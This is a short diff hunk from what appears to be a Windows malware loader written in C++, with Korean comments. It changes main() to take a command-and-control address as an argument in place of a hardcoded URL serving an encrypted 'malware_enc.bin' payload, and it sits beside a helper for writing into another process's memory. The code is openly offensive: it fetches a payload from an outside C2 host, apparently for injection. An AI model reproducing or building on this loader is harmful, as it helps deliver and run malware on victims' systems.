@@ -135,10 +135,15 @@ BOOL writeRemoteMemory(HANDLE hProc, LPVOID dest, void* data, SIZE_T size) {
 	return TRUE;
 }
 
-int main() {
+int main(int argc, const char* argv[]) {
 	// 페이로드 다운로드
+	if (argc != 2) {
+		cout << "<c2 address>" << endl;
+		return 0;
+	}
+
 	DWORD dataSize = 0;
-	unsigned char* data = downloadBinary("http://192.168.0.103:8888/malware_enc.bin", &dataSize);
+	unsigned char* data = downloadBinary(argv[1], &dataSize);
 	
 	// 페이로드 다운로드 실패 예외처리
 	if (data == nullptr) {
